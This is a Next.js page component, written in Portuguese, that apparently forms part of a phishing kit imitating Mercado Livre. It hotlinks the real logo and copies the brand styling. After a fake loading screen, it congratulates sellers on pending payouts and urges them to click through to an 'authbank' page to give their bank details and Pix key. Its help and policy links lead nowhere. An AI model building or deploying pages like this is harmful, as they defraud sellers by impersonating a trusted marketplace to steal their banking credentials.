"use client";

import { useEffect, useState } from "react";

import { LoadingComponent } from "@/loading";
import { useRouter } from "next/navigation";

export default function VeryPage() {
  const router = useRouter();

  const [loading, setLoading] = useState(true);
  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 1500);
  }, []);

  const next = () => router.push("authbank");

  if (loading) {
    return <LoadingComponent />;
  }

  return (
    <div>
      <header>
        <nav className="flex p-4 items-center justify-between  bg-[#FFE600] shadow-md">
          <button className="text-4xl">☰</button>

          <a href="./" aria-label="ir para a página inicial">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
          </a>

          <div className="flex items-center">
            <a href="#" className="text-xl">
              Ajuda
            </a>
          </div>
        </nav>
      </header>

      <main className="flex flex-col items-center justify-center mt-10 px-10 w-screen">
        <input
          type="text"
          placeholder={`busque "richards"`}
          className=" rounded border-[#e2e0e2] border-[1px] p-4 h-[40px] max-w-full min-w-[400px] mb-6"
        />

        <div className="bg-[#2968C8] p-6 flex flex-col items-center gap-4 rounded-xl w-full">
          <h2 className="text-[#fff] text-5xl font-bold">Aviso</h2>

          <p className="text-2xl text-[#fff] text-center">{`Parabéns! Falta pouco para receber os valores de suas vendas. Clique em "Avançar" para fornecer suas informações bancárias (Chave Pix ) e garantir o recebimento do valor de sua venda de forma rápida e segura. Aproveite seus ganhos e continue vendendo com sucesso!`}</p>
        </div>

        <div className="flex flex-col justify-center items-center mt-4">
          <button
            className="bg-[#2968C8] w-auto text-white px-4 py-2 rounded-md text-xl"
            onClick={next}
          >
            Avançar
          </button>

          <p className="text-base text-center mt-4">
            Ao criar uma conta, você está de acordo com os{" "}
            <a href="#" className="text-[#2968C8]">
              termos de serviço{" "}
            </a>{" "}
            e a{" "}
            <a href="#" className="text-[#2968C8]">
              política de privacidade
            </a>{" "}
            do meli.
          </p>
        </div>
      </main>
    </div>
  );
}
